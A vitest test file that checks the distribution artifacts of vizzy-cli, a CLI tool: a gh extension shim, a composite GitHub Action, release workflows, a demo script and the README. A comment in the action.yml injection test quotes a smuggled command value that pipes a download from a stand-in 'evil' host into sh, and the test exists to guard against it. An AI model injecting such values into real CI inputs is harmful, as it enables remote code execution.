/**
 * dist-artifacts.test.ts — validate in-repo distribution artifacts
 * (bead vizzy-cli-9cm.16)
 *
 * Validates:
 *   - gh-extension/gh-vizzy is a valid POSIX shell script (bash -n)
 *   - action.yml is valid YAML with required composite-action fields
 *   - examples/exposure-audit.yml is valid YAML
 *   - README contains the required distribution sections
 *
 * js-yaml is a transitive dependency already present in node_modules;
 * it is used here only at test time (not a new runtime dep).
 */

import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync } from 'node:fs';
import { execSync } from 'node:child_process';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { load as yamlLoad } from 'js-yaml';
import { commandExists } from './test-utils.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const ROOT = resolve(__dirname, '..');

function root(...parts: string[]): string {
  return resolve(ROOT, ...parts);
}

// ---------------------------------------------------------------------------
// gh-extension/gh-vizzy
// ---------------------------------------------------------------------------

describe('gh-extension/gh-vizzy shim', () => {
  it('file exists at gh-extension/gh-vizzy', () => {
    expect(existsSync(root('gh-extension', 'gh-vizzy'))).toBe(true);
  });

  it('passes bash -n (syntax check)', () => {
    const path = root('gh-extension', 'gh-vizzy');
    expect(() => {
      execSync(`bash -n ${JSON.stringify(path)}`, { stdio: 'pipe' });
    }).not.toThrow();
  });

  it('contains a shebang line', () => {
    const content = readFileSync(root('gh-extension', 'gh-vizzy'), 'utf8');
    expect(content.startsWith('#!/')).toBe(true);
  });

  it('invokes vizzy-cli (npx or node)', () => {
    const content = readFileSync(root('gh-extension', 'gh-vizzy'), 'utf8');
    expect(content).toMatch(/vizzy-cli|dist\/bin\.js/);
  });

  it('passes through all arguments ($@)', () => {
    const content = readFileSync(root('gh-extension', 'gh-vizzy'), 'utf8');
    expect(content).toContain('"$@"');
  });
});

// ---------------------------------------------------------------------------
// action.yml
// ---------------------------------------------------------------------------

describe('action.yml composite action', () => {
  it('file exists at repo root', () => {
    expect(existsSync(root('action.yml'))).toBe(true);
  });

  it('is valid YAML', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    expect(() => yamlLoad(text)).not.toThrow();
  });

  it('has a name field', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    expect(typeof doc.name).toBe('string');
    expect((doc.name as string).length).toBeGreaterThan(0);
  });

  it('runs: using: composite', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const runs = doc.runs as Record<string, unknown>;
    expect(runs).toBeDefined();
    expect(runs.using).toBe('composite');
  });

  it('has inputs: github-token and format', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const inputs = doc.inputs as Record<string, unknown>;
    expect(inputs).toBeDefined();
    expect(inputs['github-token']).toBeDefined();
    expect(inputs['format']).toBeDefined();
  });

  it('format input defaults to sarif', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const inputs = doc.inputs as Record<string, unknown>;
    const formatInput = inputs['format'] as Record<string, unknown>;
    expect(formatInput.default).toBe('sarif');
  });

  it('steps include actions/setup-node', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const runs = doc.runs as Record<string, unknown>;
    const steps = runs.steps as Array<Record<string, unknown>>;
    expect(Array.isArray(steps)).toBe(true);
    const hasSetupNode = steps.some((s) => String(s.uses ?? '').startsWith('actions/setup-node'));
    expect(hasSetupNode).toBe(true);
  });

  it('steps include npx vizzy-cli@latest --audit', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    expect(text).toMatch(/npx vizzy-cli@latest.*--audit/);
  });

  it('steps reference codeql-action/upload-sarif', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    expect(text).toMatch(/codeql-action\/upload-sarif/);
  });

  it('does not interpolate the format input directly into the run script (no injection)', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    // GitHub substitutes ${{ inputs.format }} into the script TEXT before the
    // shell runs, so a value like "text; curl evil | sh" would execute. The npx
    // line must not carry the raw expression.
    expect(text).not.toMatch(/npx vizzy-cli@latest[^\n]*\$\{\{\s*inputs\.format\s*\}\}/);
  });

  it('passes format via an env var and validates it against an allowlist', () => {
    const text = readFileSync(root('action.yml'), 'utf8');
    // Env values are not expanded as script text, so the input is safe there.
    expect(text).toMatch(/FORMAT:\s*\$\{\{\s*inputs\.format\s*\}\}/);
    // And it is checked against the closed set before use.
    expect(text).toMatch(/(sarif|json|text)\|(sarif|json|text)\|(sarif|json|text)/);
  });

  it('defines an org input and forwards it as --org when set', () => {
    // Without --org the action audits the TOKEN OWNER's personal repos; the
    // default GITHUB_TOKEN (github-actions[bot]) owns none, so the audit silently
    // no-ops with a green check. An org input lets it audit real repositories.
    const text = readFileSync(root('action.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const inputs = doc.inputs as Record<string, unknown>;
    expect(inputs['org']).toBeDefined();
    expect(text).toMatch(/ORG:\s*\$\{\{\s*inputs\.org\s*\}\}/);
    expect(text).toMatch(/--org "\$ORG"/);
  });
});

// ---------------------------------------------------------------------------
// .github/workflows/release.yml
// ---------------------------------------------------------------------------

describe('.github/workflows/release.yml', () => {
  const relPath = (): string => root('.github', 'workflows', 'release.yml');

  it('file exists and is valid YAML', () => {
    expect(existsSync(relPath())).toBe(true);
    expect(() => yamlLoad(readFileSync(relPath(), 'utf8'))).not.toThrow();
  });

  it('verifies the tag matches package.json version BEFORE publishing', () => {
    const text = readFileSync(relPath(), 'utf8');
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const doc = yamlLoad(text) as any;
    const steps = doc.jobs.release.steps as Array<Record<string, unknown>>;

    const guardIdx = steps.findIndex(
      (s) =>
        typeof s.run === 'string' &&
        /package\.json/.test(s.run) &&
        /GITHUB_REF/.test(s.run),
    );
    const publishIdx = steps.findIndex(
      (s) => typeof s.run === 'string' && /npm publish/.test(s.run),
    );

    expect(guardIdx).toBeGreaterThanOrEqual(0); // a tag/version guard exists
    expect(publishIdx).toBeGreaterThanOrEqual(0);
    expect(guardIdx).toBeLessThan(publishIdx); // and it runs before publish
  });
});

// ---------------------------------------------------------------------------
// examples/exposure-audit.yml
// ---------------------------------------------------------------------------

describe('examples/exposure-audit.yml sample workflow', () => {
  it('file exists', () => {
    expect(existsSync(root('examples', 'exposure-audit.yml'))).toBe(true);
  });

  it('is valid YAML', () => {
    const text = readFileSync(root('examples', 'exposure-audit.yml'), 'utf8');
    expect(() => yamlLoad(text)).not.toThrow();
  });

  it('has on: schedule or on: pull_request trigger', () => {
    const text = readFileSync(root('examples', 'exposure-audit.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const on = doc['on'] as Record<string, unknown> | undefined;
    expect(on).toBeDefined();
    const hasSchedule = 'schedule' in (on ?? {});
    const hasPR = 'pull_request' in (on ?? {});
    expect(hasSchedule || hasPR).toBe(true);
  });

  it('references the vizzy action (uses: ./)', () => {
    const text = readFileSync(root('examples', 'exposure-audit.yml'), 'utf8');
    expect(text).toMatch(/uses:\s*\.\//);
  });
});

// ---------------------------------------------------------------------------
// README distribution sections
// ---------------------------------------------------------------------------

describe('README distribution sections', () => {
  it('contains an "Install as a gh extension" section', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/install as a gh extension/i);
  });

  it('README gh extension section mentions gh-vizzy', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toContain('gh-vizzy');
  });

  it('README contains a GitHub Action usage section', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/github action/i);
  });

  it('README GitHub Action section contains action.yml usage snippet', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/uses:\s*jakecastillo\/vizzy-cli/);
  });
});

// ---------------------------------------------------------------------------
// .github/workflows/release.yml — bead vizzy-cli-9cm.17
// ---------------------------------------------------------------------------

describe('.github/workflows/release.yml', () => {
  it('file exists', () => {
    expect(existsSync(root('.github', 'workflows', 'release.yml'))).toBe(true);
  });

  it('is valid YAML', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    expect(() => yamlLoad(text)).not.toThrow();
  });

  it('triggers on push tags v*', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const on = doc['on'] as Record<string, unknown>;
    expect(on).toBeDefined();
    const push = on['push'] as Record<string, unknown> | undefined;
    expect(push).toBeDefined();
    const tags = push!['tags'] as string[] | undefined;
    expect(Array.isArray(tags)).toBe(true);
    expect(tags!.some((t) => t.startsWith('v'))).toBe(true);
  });

  it('has id-token: write permission (OIDC)', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const perms = doc['permissions'] as Record<string, string> | undefined;
    expect(perms).toBeDefined();
    expect(perms!['id-token']).toBe('write');
  });

  it('has contents: read permission', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    const doc = yamlLoad(text) as Record<string, unknown>;
    const perms = doc['permissions'] as Record<string, string> | undefined;
    expect(perms!['contents']).toBe('read');
  });

  it('includes setup-node step', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    expect(text).toMatch(/actions\/setup-node/);
  });

  it('includes npm ci step', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    expect(text).toMatch(/npm ci/);
  });

  it('includes npm run build step', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    expect(text).toMatch(/npm run build/);
  });

  it('includes npm publish --provenance --access public', () => {
    const text = readFileSync(root('.github', 'workflows', 'release.yml'), 'utf8');
    expect(text).toMatch(/npm publish.*--provenance.*--access public|npm publish.*--access public.*--provenance/);
  });
});

// ---------------------------------------------------------------------------
// demo/vizzy.tape — bead vizzy-cli-9cm.17
// ---------------------------------------------------------------------------

describe('demo/vizzy.tape VHS script', () => {
  it('file exists', () => {
    expect(existsSync(root('demo', 'vizzy.tape'))).toBe(true);
  });

  it('has an Output line (specifies GIF destination)', () => {
    const text = readFileSync(root('demo', 'vizzy.tape'), 'utf8');
    expect(text).toMatch(/^Output\s+/m);
  });

  it('references demo/vizzy.gif as output', () => {
    const text = readFileSync(root('demo', 'vizzy.tape'), 'utf8');
    expect(text).toMatch(/vizzy\.gif/);
  });

  it('leads with the safety-skip scenario (danger repo skipped)', () => {
    const text = readFileSync(root('demo', 'vizzy.tape'), 'utf8');
    // The danger / skip scenario should appear near the top (before the main flow)
    const dangerIdx = text.search(/danger|skip|DANGER|SKIP/i);
    expect(dangerIdx).toBeGreaterThan(-1);
    expect(dangerIdx).toBeLessThan(500);
  });

  it('contains at least one Type or Key command', () => {
    const text = readFileSync(root('demo', 'vizzy.tape'), 'utf8');
    expect(text).toMatch(/^(Type|Key)\s+/m);
  });
});

// ---------------------------------------------------------------------------
// scripts/render-demo.sh — bead vizzy-cli-9cm.17
// ---------------------------------------------------------------------------

describe('scripts/render-demo.sh', () => {
  it('file exists', () => {
    expect(existsSync(root('scripts', 'render-demo.sh'))).toBe(true);
  });

  it('passes bash -n (syntax check)', () => {
    const path = root('scripts', 'render-demo.sh');
    expect(() => {
      execSync(`bash -n ${JSON.stringify(path)}`, { stdio: 'pipe' });
    }).not.toThrow();
  });

  it('contains shebang', () => {
    const text = readFileSync(root('scripts', 'render-demo.sh'), 'utf8');
    expect(text.startsWith('#!/')).toBe(true);
  });

  it('invokes vhs demo/vizzy.tape', () => {
    const text = readFileSync(root('scripts', 'render-demo.sh'), 'utf8');
    expect(text).toMatch(/vhs.*demo\/vizzy\.tape|vhs.*vizzy\.tape/);
  });

  // shellcheck is an optional dev tool: enforce it wherever it's installed (CI),
  // skip it where it isn't (e.g. a Windows dev box) so the suite stays green.
  it.skipIf(!commandExists('shellcheck'))('passes shellcheck', () => {
    const path = root('scripts', 'render-demo.sh');
    expect(() => {
      execSync(`shellcheck ${JSON.stringify(path)}`, { stdio: 'pipe' });
    }).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// README demo slot + install matrix — bead vizzy-cli-9cm.17
// ---------------------------------------------------------------------------

describe('README demo slot and install matrix', () => {
  it('contains an img tag or markdown image referencing demo/vizzy.gif', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/demo\/vizzy\.gif/);
  });

  it('contains npx vizzy-cli in install matrix', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/npx vizzy-cli/);
  });

  it('contains npm i -g vizzy-cli in install matrix', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/npm i -g vizzy-cli|npm install -g vizzy-cli/);
  });

  it('contains gh extension install in install matrix', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/gh extension install/);
  });

  it('contains brew or Homebrew reference in install matrix', () => {
    const text = readFileSync(root('README.md'), 'utf8');
    expect(text).toMatch(/brew|Homebrew/i);
  });
});
